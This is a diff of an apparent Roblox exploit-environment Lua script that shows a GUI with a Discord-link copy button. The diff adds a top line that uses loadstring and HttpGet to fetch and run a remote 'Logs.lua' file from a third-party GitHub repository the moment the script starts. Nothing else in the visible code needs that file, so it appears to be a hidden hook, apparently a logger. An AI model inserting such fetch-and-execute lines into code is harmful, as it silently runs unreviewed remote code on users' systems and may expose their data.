@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evelynnscripts/Evelynn-Hub-V9/refs/heads/main/Helpers/Logs.lua",true))()
 local Players = game:GetService("Players")
 local playerName = Players.LocalPlayer.Name
 local gui = Instance.new("ScreenGui", game.CoreGui)
@@ -60,7 +61,6 @@ createFuturisticButton("Copy discord Link", UDim2.new(0, 50, 1, -60), function()
 	setclipboard("https://discord.gg/w7D4W4j27j")
 	message.Text = message.Text .. "\n\n✅ Copied!"
 end)
-
 createFuturisticButton("Ok", UDim2.new(1, -250, 1, -60), function()
 	gui:Destroy()
 end)
